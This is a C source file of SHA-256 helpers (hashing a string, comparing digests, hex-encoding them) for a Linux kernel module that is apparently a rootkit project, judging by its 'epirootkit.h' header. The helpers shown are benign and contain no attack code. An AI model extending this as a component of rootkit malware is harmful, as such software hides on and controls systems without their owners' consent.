#include <crypto/hash.h>
#include <linux/crypto.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "epirootkit.h"

int hash_string(const char *input, u8 *digest);
bool are_hash_equals(const u8 *h1, const u8 *h2);
void hash_to_str(const u8 *digest, char *output);

int hash_string(const char *input, u8 *digest) {
    struct crypto_shash *tfm;
    struct shash_desc *shash;
    char *desc_buffer;
    int desc_size, ret;

    if (!input || !digest)
        return -EINVAL;

    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm)) {
        pr_err("Erreur allocation tfm SHA-256\n");
        return PTR_ERR(tfm);
    }

    desc_size = sizeof(struct shash_desc) + crypto_shash_descsize(tfm);
    desc_buffer = kmalloc(desc_size, GFP_KERNEL);
    if (!desc_buffer) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }

    shash = (struct shash_desc *)desc_buffer;
    shash->tfm = tfm;
    // shash->flags = 0;

    ret = crypto_shash_digest(shash, input, strlen(input), digest);

    kfree(desc_buffer);
    crypto_free_shash(tfm);

    return ret;
}

bool are_hash_equals(const u8 *h1, const u8 *h2) {
    if (!h1 || !h2)
        return false;

    return (memcmp(h1, h2, SHA256_DIGEST_SIZE) == 0) ? true : false;
}

void hash_to_str(const u8 *digest, char *output) {
    int i;

    if (!digest || !output) {
        pr_err("hash_to_str: digest or output NULL\n");
        return;
    }

    for (i = 0; i < SHA256_DIGEST_SIZE; i++)
        sprintf(output + (i * 2), "%02x", digest[i]);
    output[SHA256_DIGEST_SIZE * 2] = '\0';
}
